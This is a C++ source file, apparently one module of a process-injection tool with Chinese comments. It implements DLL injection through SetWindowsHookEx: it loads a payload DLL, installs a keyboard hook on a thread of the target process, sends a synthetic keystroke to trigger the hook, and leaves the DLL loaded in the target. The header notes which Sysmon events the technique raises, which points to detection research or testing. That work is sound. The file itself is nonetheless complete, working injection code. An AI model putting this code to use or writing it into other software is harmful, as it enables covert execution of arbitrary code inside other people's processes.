// ════════════════════════════════════════════════════════════════
//  方法 6: 全局钩子注入 — SetWindowsHookEx
//
//  原理：
//    1. 用 DONT_RESOLVE_DLL_REFERENCES 加载 DLL 获取模块句柄
//       （不把 DLL 完整加载到 inject.exe 进程空间）
//    2. 获取 DLL 导出的 HookProc 回调函数地址
//    3. SetWindowsHookEx(WH_KEYBOARD, HookProc, hDll, targetThreadId)
//       Windows 会自动把 DLL 映射到拥有目标线程的进程中
//    4. 发一条键盘消息触发钩子，DLL 就被加载到目标进程
//
//  检测特征：
//    - Sysmon Event 7:  DLL 加载（ImageLoad），路径是 payload.dll
//    - Sysmon Event 10: 不触发（没有 OpenProcess）
//    - 特殊：DLL 通过 Windows 消息机制加载，不是传统注入
// ════════════════════════════════════════════════════════════════
#include "../methods.h"
#include <tlhelp32.h>

typedef LRESULT(CALLBACK* HOOKPROC)(int, WPARAM, LPARAM);

// 查找目标进程中的一个 GUI 线程 ID
static DWORD FindTargetThread(DWORD pid)
{
    // 方法 1: EnumWindows → GetWindowThreadProcessId（优先 GUI 线程）
    struct Ctx { DWORD pid; DWORD tid; };
    Ctx ctx{ pid, 0 };
    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
        auto* c = reinterpret_cast<Ctx*>(lParam);
        DWORD winPid = 0;
        DWORD tid = GetWindowThreadProcessId(hwnd, &winPid);
        if (winPid == c->pid && IsWindowVisible(hwnd))
        {
            c->tid = tid;
            return FALSE;
        }
        return TRUE;
    }, (LPARAM)&ctx);

    if (ctx.tid) return ctx.tid;

    // 方法 2: 枚举线程快照
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te{};
    te.dwSize = sizeof(te);
    if (Thread32First(snap, &te))
    {
        do {
            if (te.th32OwnerProcessID == pid)
            {
                CloseHandle(snap);
                return te.th32ThreadID;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return 0;
}

bool Inject_GlobalHook(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] 全局钩子注入 → PID=%lu\n", pid);

    // ── 1. 加载 DLL 模块（不执行 DllMain，不解析导入）──
    //  这样 DLL 不会被"加载"到 inject.exe 的进程空间
    //  但我们可以获得模块句柄和导出函数地址
    HMODULE hDll = LoadLibraryExW(dllPath, nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hDll)
    {
        // 回退：普通加载
        hDll = LoadLibraryW(dllPath);
        if (!hDll)
        {
            Print(L"  [!] 加载 DLL 失败: %lu\n", GetLastError());
            return false;
        }
        Print(L"  [!] 使用普通加载（DLL 已进入 inject.exe 进程空间）\n");
    }

    // ── 2. 获取 DLL 导出的 HookProc ──
    HOOKPROC hookProc = (HOOKPROC)GetProcAddress(hDll, "HookProc");
    if (!hookProc)
    {
        Print(L"  [!] DLL 未导出 HookProc，无法进行钩子注入\n");
        FreeLibrary(hDll);
        return false;
    }

    Print(L"  [+] DLL 模块 @ %p\n", hDll);
    Print(L"  [+] HookProc @ %p\n", hookProc);

    // ── 3. 找到目标进程的线程 ──
    DWORD targetTid = FindTargetThread(pid);
    if (!targetTid)
    {
        Print(L"  [!] 找不到目标进程的线程\n");
        FreeLibrary(hDll);
        return false;
    }
    Print(L"  [+] 目标线程 TID=%lu\n", targetTid);

    // ── 4. 安装钩子（指定目标线程）──
    //  用目标线程 ID 而非 0（全局），确保 DLL 注入到目标进程
    HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD, hookProc, hDll, targetTid);
    if (!hHook)
    {
        Print(L"  [!] SetWindowsHookEx 失败: %lu\n", GetLastError());
        FreeLibrary(hDll);
        return false;
    }
    Print(L"  [+] 钩子已安装 HHOOK=%p (Thread-specific)\n", hHook);

    // ── 5. 发送键盘事件触发钩子 ──
    //  WH_KEYBOARD 钩子在目标线程处理键盘消息时触发
    //  keybd_event 会由系统分发到前台窗口的线程
    Print(L"  [*] 发送键盘事件触发钩子...\n");

    // 先把焦点设到目标窗口
    struct EnumCtx { DWORD pid; HWND found; };
    EnumCtx ectx{ pid, nullptr };
    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
        auto* p = reinterpret_cast<EnumCtx*>(lParam);
        DWORD wPid = 0;
        GetWindowThreadProcessId(hwnd, &wPid);
        if (wPid == p->pid && IsWindowVisible(hwnd))
        {
            p->found = hwnd;
            return FALSE;
        }
        return TRUE;
    }, (LPARAM)&ectx);

    if (ectx.found)
    {
        SetForegroundWindow(ectx.found);
        Sleep(100);
    }

    // 发送一个无害的键盘事件（F15，不会影响用户输入）
    keybd_event(VK_F15, 0, 0, 0);           // key down
    keybd_event(VK_F15, 0, KEYEVENTF_KEYUP, 0); // key up

    // 等待 DLL 在目标进程中加载
    Sleep(2000);

    // ── 6. 清理钩子 ──
    //  卸载钩子后 DLL 仍留在目标进程（已加载的模块不会被自动卸载）
    UnhookWindowsHookEx(hHook);
    Print(L"  [+] 钩子已卸载\n");

    FreeLibrary(hDll); // 释放 inject.exe 对 DLL 的引用

    Print(L"  [✓] 全局钩子注入完成（DLL 应已加载到 PID=%lu）\n", pid);
    return true;
}
